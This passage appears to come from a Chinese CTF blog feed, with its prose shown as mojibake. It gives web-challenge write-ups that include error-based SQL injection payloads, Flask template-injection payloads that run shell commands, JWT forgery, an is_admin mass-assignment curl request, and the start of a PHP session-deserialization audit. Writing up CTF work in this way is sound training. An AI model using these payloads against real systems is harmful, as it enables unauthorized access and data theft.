class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>å›æ˜¾XPATH syntax error:~users~ï¼Œçˆ†å‡ºäº†è¡¨åusers<br>è¿™é‡Œéœ€è¦è¯´åä¸€ä¸‹ï¼Œç”±äºå•åŒå¼•å·è¢«è¿‡æ»¤ï¼Œæ•…æ³¨å…¥è¯­å¥ä¸­å¦‚æœæœ‰å­—ç¬¦ä¸²éœ€è¦å•åŒå¼•å·ï¼Œåº”å½“å°½é‡é¿å…ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æŸ¥è¯¢è¯­å¥çš„å¤šé‡åˆ©ç”¨é¿å…ï¼Œå½“ç„¶ç›´æ¥å¡«åº“åä¹Ÿæ˜¯ä¸éœ€è¦å•åŒå¼•å·çš„ï¼ˆä¸‹é¢è¡¨ååŒç†ï¼‰ã€‚<br>3ã€çˆ†åˆ—å</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>å›æ˜¾XPATH syntax error:~userã€uniqueid~ï¼Œçˆ†å‡ºåˆ—åuserã€uniqueidï¼Œè¿™ä¸¤ä¸ªåˆ—é‡Œè‚¯å®šæœ‰æˆ‘ä»¬éœ€è¦çš„é‡è¦å†…å®¹ã€‚<br>4ã€çˆ†å­—æ®µ</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">https://babyweb.rootersctf.<span class="keyword">in</span>/<span class="keyword">index</span>.php?<span class="keyword">search</span>=<span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> uniqueid/<span class="keyword">user</span> <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ†ä¸¤æ­¥åˆ†åˆ«çˆ†å‡ºadminå’Œå…¶å¯¹åº”çš„18ä½çš„uniqueidï¼Œæ‹¿å»å°è¯•ç™»å½•ï¼ŒæˆåŠŸç™»è·¯å¹¶æ‹¿åˆ°flagã€‚<br>ç”±äºç¯å¢ƒä¸èƒ½å¤ç°ï¼Œåšé¢˜çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æˆªå›¾ï¼Œè¿™é‡Œä¸å†è´´å‡ºå›¾ç‰‡ã€‚</p><p>æŠ¥é”™æ³¨å…¥å‚è€ƒé“¾æ¥ï¼š<a href="https://www.jianshu.com/p/bf5edd484957">https://www.jianshu.com/p/bf5edd484957</a></p><h2 id="I-lt-3-Flask"><a href="#I-lt-3-Flask" class="headerlink" title="I_&lt;3_Flask"></a>I_&lt;3_Flask</h2><p>å…¸å‹çš„SSTIï¼Œå‚è€ƒå›½å¤–å¸ˆå‚…çš„WPå­¦åˆ°äº†ä¸€äº›æ–°å§¿åŠ¿</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼š<br><img src="http://www.ggb0n.cool/images/rooters1.png" alt=""></p><p>æ–­å®šæ˜¯python flaskçš„SSTIäº†ï¼Œä½†æ˜¯ä¸çŸ¥é“å‚æ•°æ˜¯å•¥ï¼Œåœ¨å¤ç°çš„æ—¶å€™å‘ç°å›½å¤–å¸ˆå‚…æåˆ°ä¸€ä¸ªå‚æ•°æ‰«æçš„å·¥å…·<a href="https://github.com/s0md3v/Arjun">arjun</a>ï¼Œç›´æ¥æ‰«å‚æ•°ï¼š<br><img src="http://www.ggb0n.cool/images/rooters2.png" alt=""></p><p>ç”¨<code>name</code>å‚æ•°æµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/rooters3.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ³¨å…¥ï¼Œé‚£ä¸‹é¢å°±æ˜¯åˆ©ç”¨æ³¨å…¥å§¿åŠ¿æ¥çˆ†flagäº†ã€‚</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä¸€ç§è§£é¢˜çš„payloadæ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[184].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ–¹æ³•åœ¨å¤ç°çš„æ—¶å€™æ²¡æœ‰æˆåŠŸï¼Œå­¦åˆ°å¦å¤–ä¸€ç§å§¿åŠ¿ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;].open(&#39;flag.txt&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/rooters4.png" alt=""></p><p>å‚è€ƒï¼š<br><a href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8</a><br><a href="https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2">https://graneed.hatenablog.com/entry/2019/10/13/010814#Solution-2</a></p><h2 id="ImgXweb"><a href="#ImgXweb" class="headerlink" title="ImgXweb"></a>ImgXweb</h2><p>è€ƒå¯ŸJWTä¼ªé€ æ”»å‡»ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®å‘ç°å­˜åœ¨æ³¨å†Œã€ç™»å½•æŒ‰é’®ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªç™»å½•çœ‹çœ‹ï¼Œå‘ç°å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯å¥ˆä½•æœ¬é¢˜ä¸æ˜¯è€ƒæ–‡ä»¶ä¸Šä¼ æ‹¿shellçš„â€¦</p><p>é€šè¿‡æ‰«åå°å‘ç°<code>robots.txt</code>çš„å­˜åœ¨ï¼ˆå¯è§æ‰«åå°çš„é‡è¦æ€§å•Šï¼‰ï¼š<br><img src="http://www.ggb0n.cool/images/rooters13.png" alt=""></p><p>è€Œ<code>robots.txt</code>ä¸­æç¤ºäº†ä¸€ä¸ª<code>secretkey</code>ç§˜é’¥æ–‡ä»¶çš„å­˜åœ¨ï¼Œå†…å®¹å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/rooters5.png" alt=""></p><p>ç»™è¿™ä¸ªå¹²å˜›ï¼Ÿç»“æœæŠ“åŒ…å‘ç°äº†å¦ä¸€ç•ªå¤©åœ°ï¼š<br><img src="http://www.ggb0n.cool/images/rooters6.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°cookieé‡‡ç”¨äº†JWTï¼Œæ‹¿å»base64è§£å¯†ä¸€ä¸‹ï¼ˆè¿˜æœ‰å‡ ç¯‡è®²åˆ°JWTä¼ªé€ æ”»å‡»çš„åšå®¢ï¼Œæœ‰éœ€è¦çš„å¯ä»¥çœ‹çœ‹ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&#123;&quot;user&quot;:&quot;ggb0n&quot;&#125;Ã—Â¿ÂŠÃ°Â¬Ã#ÃˆÂ”Â¬Â­ Â“Ã­_mnÃ—Â’ÂZÂÃ¼Â–Â‰t</span><br></pre></td></tr></table></figure><p>è¿™è‚¯å®šæ˜¯è€ƒJWTä¼ªé€ çš„äº†ï¼Œç§˜é’¥éƒ½ç»™äº†ï¼Œå¤šç®€å•ï¼Œæ‹¿å»ç½‘ç«™ä¼ªé€ ä¸€ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/rooters7.png" alt=""></p><p>ç„¶åæŠ“åŒ…æ”¹åŒ…ï¼Œå‘ç°æˆåŠŸä¼ªé€ äº†adminèº«ä»½ï¼Œä»å›æ˜¾é¡µé¢ä¸­å¯ä»¥çœ‹åˆ°<code>flag.png</code>çš„å­˜åœ¨ï¼Œè¿™é‡Œèµµå¸ˆå‚…æ²¡æœ‰æ”¾åŸå›¾ï¼Œåº”è¯¥æ˜¯ä¸ºäº†æ–¹ä¾¿BOTç”Ÿæˆå’Œè¯†åˆ«å›ºå®šæ ¼å¼çš„flagå§ï¼š<br><img src="http://www.ggb0n.cool/images/rooters8.png" alt=""></p><p>å…¶å®ï¼Œflagå·²ç»å¾ˆè¿‘äº†ï¼ŒæŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°flag.pngçš„å­˜å‚¨è·¯å¾„ï¼Œç›´æ¥è®¿é—®å³å¯æ‹¿åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/rooters9.png" alt=""></p><p><img src="http://www.ggb0n.cool/images/rooters10.png" alt=""></p><p>åŸæ¥pngä¸æ˜¯pngï¼Œè€Œæ˜¯txtå•Šâ€¦èµµå¸ˆå‚…badbadã€‚ã€‚ã€‚</p><h2 id="notifyxapi"><a href="#notifyxapi" class="headerlink" title="notifyxapi"></a>notifyxapi</h2><p>è¿˜æ˜¯è€ƒå¯ŸJWTä¼ªé€ æ”»å‡»ã€‚</p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œçœ‹åˆ°ç»™å‡ºäº†å‡ ä¸ªåˆ©ç”¨<code>curl</code>è¿›è¡Œæ³¨å†Œã€ç™»å½•ã€æŸ¥çœ‹é€šçŸ¥çš„å‡ ä¸ªæ“ä½œï¼š<br><img src="http://www.ggb0n.cool/images/rooters11.png" alt=""></p><p><img src="http://www.ggb0n.cool/images/rooters12.png" alt=""></p><p>æœ‰ç‚¹åƒæ•™æ€ä¹ˆç”¨curlçš„[æ‰‹åŠ¨æ»‘ç¨½]ï¼Œæˆ‘ä»¬æ ¹æ®æä¾›çš„è¯­å¥å»è¯•è¯•æ•ˆæœï¼š</p><p>å…ˆæ³¨å†Œä¸ªè´¦æˆ·ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "ggb0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"created_user":&#123;"id":<span class="number">3</span>,"user":&#123;"email":"ggb0n@test.com","id":<span class="number">3</span>,"is_admin":false&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTI2NTEsIm5iZiI6MTU4NDA5MjY1MSwianRpIjoiMTIyZDQ2MTQtNzZhYS00YjJhLTlmZWEtYmY1OTE0ZTQ5OTk0IiwiZXhwIjoxNjE1NjI4NjUxLCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.r8-IqT1VUwqJuYpHgKI6uqQZn6nR07RoDnDWWGgyeVc"&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…³æ³¨çš„ç‚¹æ¥äº†ï¼š<code>is_admin</code>å±æ€§ä¸º<code>false</code>ï¼Œå¤šåŠçŸ¥é“è¿™é¢˜æ˜¯å¹²å˜›çš„äº†ã€‚å…ˆä¸ç®¡ï¼Œå…ˆç™»å½•çœ‹çœ‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "ggb0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"id":&#123;"email":"ggb0n@test.com","id":<span class="number">3</span>,"is_admin":false&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTMwNDcsIm5iZiI6MTU4NDA5MzA0NywianRpIjoiZjFlYmViYjItMmFmMi00OWFjLTljN2UtNjFlODM3MTVkN2I2IiwiZXhwIjoxNjE1NjI5MDQ3LCJpZGVudGl0eSI6MywiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.Nj2knq7DFsNRoZhNfyAvbMp6wMPV6lWAcXM1p6xIqRo"&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç™»å½•å’Œæ³¨å†Œçš„æ—¶å€™<code>JWT</code>çš„ç¬¬ä¸‰éƒ¨åˆ†æ˜¯ä¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯è¡¨ç¤ºç™»å½•çš„çŠ¶æ€ï¼Œçœ‹é€šçŸ¥çš„è¯ï¼Œå½“ç„¶è¦å…ˆç™»å½•å˜›ã€‚</p><p>æ‹¿ç™»å½•ä¸Šçš„JWTå»çœ‹çœ‹notificationä»€ä¹ˆæƒ…å†µï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -H "Authorization: Bearer $ACCESS" -H "Content-<span class="built_in">Type</span>: application/json" "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/"</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"hey, rosssssss","id":<span class="number">2</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"Jen Barber? Is that the internet?","id":<span class="number">3</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;]</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªè¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆ«çš„ç”¨æˆ·å‘çš„é€šçŸ¥ï¼Œæƒ³å¿…ç®¡ç†å‘˜èƒ½çœ‹åˆ°ä¸ä¸€æ ·çš„ç»“æœå§ï¼Œç»“åˆå‰é¢å­˜åœ¨çš„<code>is_admin</code>å±æ€§å¹¶ä¸”ä¸º<code>false</code>ï¼Œæ€è·¯è‚¯å®šæ˜¯è¦å»æƒ³åŠæ³•è®©<code>is_admin</code>ä¸º<code>true</code>äº†ã€‚</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ç”±äºå›æ˜¾çš„éƒ½æ˜¯æ³¨å†Œæ—¶å€™çš„é”®å€¼å¯¹ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æ³¨å†Œçš„æ—¶å€™å¤šåŠ ä¸€ä¸ª<code>&quot;id_admin&quot;:true</code>çš„å±æ€§é”®å€¼å¯¹åˆ›å»ºä¸ªè´¦æˆ·è¯•è¯•ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/register/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "gg.b0n@test.com", "password": <span class="number">1</span>"password","is_admin":true&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"created_user":&#123;"id":<span class="number">4</span>,"user":&#123;"email":"gg.b0n@test.com","id":<span class="number">4</span>,"is_admin":true&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM3MzQsIm5iZiI6MTU4NDA5MzczNCwianRpIjoiZjcyMTYzNWEtZTQ1Ny00NTA0LWI0MDEtNjlmMGM1NzM2OGI1IiwiZXhwIjoxNjE1NjI5NzM0LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.NC-cqxfT8wWgsyDzXMo04NLfAK9k7uim8M127DixOAw"&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¯è§è´¦æˆ·æˆåŠŸåˆ›å»ºäº†ï¼Œå¹¶ä¸”æ­¤æ—¶<code>is_admin</code>å±æ€§å·²ç»ä¸º<code>true</code>äº†ï¼Œå¿«ç™»é™†å»çœ‹çœ‹é€šçŸ¥ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -X POST "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/login/" -H "Content-<span class="built_in">Type</span>: application/json" -d '&#123;"email": "gg.b0n@test.com", "password": "password"&#125;'</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;"id":&#123;"email":"gg.b0n@test.com","id":<span class="number">4</span>,"is_admin":true&#125;,"authentication_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM"&#125;</span><br></pre></td></tr></table></figure><p>ç”¨ç™»å½•ä¸Šçš„<code>JWT</code>å»çœ‹é€šçŸ¥ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">export ACCESS="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1ODQwOTM4ODcsIm5iZiI6MTU4NDA5Mzg4NywianRpIjoiNjUzN2ZlYzMtNzYyOC00ZGZlLTk1MmQtYzE1YmQ5ODhiNjQ0IiwiZXhwIjoxNjE1NjI5ODg3LCJpZGVudGl0eSI6NCwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FiyXpksBx-zkMQDEkfW61bs2FtqttNz5Qv1yHStqWrM"</span><br><span class="line"></span><br><span class="line">curl -H "Authorization: Bearer $ACCESS" -H "Content-<span class="built_in">Type</span>: application/json" "http://ebd88188-<span class="number">17</span>ee-<span class="number">4</span>d51-<span class="number">84</span>e5-ee623303e5aa.node3.buuoj.cn/api/v1/notifications/"</span><br></pre></td></tr></table></figure><p>å›æ˜¾å¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[&#123;"issuer":&#123;"email":"admin@test.com","id":<span class="number">1</span>&#125;,"body":"rooters&#123;a_big_hard_business_in_a_big_hard_building&#125;ctf","id":<span class="number">1</span>,"<span class="built_in">title</span>":"flag"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"hey, rosssssss","id":<span class="number">2</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"test@test.com","id":<span class="number">2</span>&#125;,"body":"Jen Barber? Is that the internet?","id":<span class="number">3</span>,"<span class="built_in">title</span>":"The IT Crowd"&#125;,&#123;"issuer":&#123;"email":"admin@test.com","id":<span class="number">1</span>&#125;,"body":"flag&#123;<span class="number">1</span>b411b83-d725-<span class="number">4</span>e8f-a50a-<span class="number">3</span>bd14a35de6a&#125;","id":<span class="number">1</span>,"<span class="built_in">title</span>":"flag"&#125;]</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‹¿åˆ°flagã€‚<br>è¿™é¢˜ç®—æ˜¯è€ƒå¯ŸJWTä¼ªé€ æ¯”è¾ƒç®€å•çš„äº†å§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTFtimeä¸Šå›½å¤–çš„æ¯”èµ›è¿˜æ˜¯æ¯”è¾ƒå¤šçš„ï¼Œè€Œä¸”å¤§å¤šä¹Ÿéƒ½æ¯”è¾ƒæœ‰æ„æ€ï¼Œå¼€æ‹“è§†é‡ã€‚
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="èµ›é¢˜å¤ç°" scheme="http://ggb0n.cool/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Cookieæ”»å‡»" scheme="http://ggb0n.cool/tags/Cookie%E6%94%BB%E5%87%BB/"/>
    
      <category term="SQLæ³¨å…¥" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="æŠ¥é”™æ³¨å…¥" scheme="http://ggb0n.cool/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
      <category term="JWTä¼ªé€ " scheme="http://ggb0n.cool/tags/JWT%E4%BC%AA%E9%80%A0/"/>
    
      <category term="SSTI" scheme="http://ggb0n.cool/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>é«˜æ ¡æˆ˜&quot;ç–«&quot;éƒ¨åˆ†é¢˜è§£</title>
    <link href="http://ggb0n.cool/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://ggb0n.cool/2020/03/07/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-07T06:44:03.000Z</published>
    <updated>2020-05-13T03:10:29.138Z</updated>
    
    <content type="html"><![CDATA[<p>20å¤šæ‰€é«˜æ ¡è”åˆå‡ºé¢˜æŠ—â€œç–«â€çš„æ¯”èµ›ï¼Œæ’é¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¥æ„Ÿå—ä¸€ä¸‹ä¼˜ç§€é«˜æ ¡çš„ç†é™¶ã€‚ğŸ§<a id="more"></a></p><h1 id="DAY-1"><a href="#DAY-1" class="headerlink" title="DAY 1"></a>DAY 1</h1><p>çœ‹é˜Ÿå‹å¸ˆå‚…ä»¬åˆ†äº«çš„æ–‡ç« ï¼Œç£•ç£•ç¢°ç¢°æ€»ç®—ä¹Ÿåšå‡ºäº†å‡ é¢˜</p><h2 id="sqlcheckin"><a href="#sqlcheckin" class="headerlink" title="sqlcheckin"></a>sqlcheckin</h2><p>è€ƒå¯Ÿsqlæ³¨å…¥</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥ç›´æ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    $pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=sqlsql;charset=utf8;'</span>, <span class="string">'xxx'</span>, <span class="string">'xxx'</span>);</span><br><span class="line">    $pdo-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);</span><br><span class="line">    $stmt = $pdo-&gt;prepare(<span class="string">"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'"</span>);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $result = $stmt-&gt;fetchAll();</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($result[<span class="number">0</span>][<span class="string">'username'</span>] == <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    <span class="comment">// ....</span></span><br></pre></td></tr></table></figure><p>å‘ç°åˆæ˜¯ç”¨çš„<code>PDO</code>ï¼Œå‰æ®µæ—¶é—´åˆ·é¢˜ï¼Œè¿˜æœ‰èµ›é¢˜éƒ½å‡ºç°äº†ï¼Œè¿™æ€•æ˜¯ä¸€ç§è¶‹åŠ¿ã€‚</p><p>ä¸è¿‡è¿™é¢˜ä¸éš¾ï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œä¸€èˆ¬çš„ä¸‡èƒ½å¯†ç æ˜¯ä¸å¥½ç”¨äº†ï¼Œå› ä¸º<code>or</code>è¢«banäº†ï¼Œä½†æ˜¯é€šè¿‡è¯»ä»£ç å¾ˆå®¹æ˜“èƒ½å‘ç°<code>password</code>å¤„å­˜åœ¨æ³¨å…¥ï¼Œ<code>or</code>ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯åˆ©ç”¨å‡å·å¯ä»¥æ„é€ ä¸€ä¸ª<code>password=false</code>çš„è¯­å¥ï¼Œè¿™æ ·å°±ä¸åœ¨åˆ¤æ–­<code>password</code>äº†ï¼Œæœ€ååˆ©ç”¨ <code>admin/1&#39;-&#39;1</code>ç™»å½•å³å¯æ‹¿åˆ°flagã€‚</p><h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>è€ƒå¯Ÿ<code>PHP session</code>çš„ååºåˆ—åŒ–æ¼æ´ï¼Œä¸»è¦åˆ©ç”¨äº†<code>session.serialize_handler</code>åºåˆ—åŒ–å’Œååºåˆ—åŒ–é‡‡ç”¨<code>PHP</code>è€Œå¯¼è‡´çš„æ¼æ´ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿›å…¥é¢˜ç›®ï¼Œé¦–å…ˆç™»å½•ä¸Šå‘ç°å¯ä»¥æ›´æ”¹<code>sign</code>ï¼Œåº”è¯¥ä¸ç®¡ç†å‘˜æƒé™æœ‰å…³ã€‚ä½†æ˜¯æŠ“åŒ…ä¹Ÿçœ‹ä¸å‡ºå¯åˆ©ç”¨çš„ç‚¹ã€‚</p><p>ç„¶åå°±æ‰«äº†åå°ï¼ŒçœŸçš„å­˜åœ¨æºç ï¼åœ¨<code>/www.zip</code>è·¯å¾„ä¸‹ï¼Œä¸‹è½½ä¹‹ååˆæ˜¯ä¸€ç•ªä»£ç å®¡è®¡ï¼Œåœ¨<code>profile.php</code>å‘ç°äº†é—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">'session'</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'lib.php'</span>;</span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="keyword">public</span> $sign;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $_SESSION[<span class="string">'admin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sign = $_SESSION[<span class="string">'sign'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 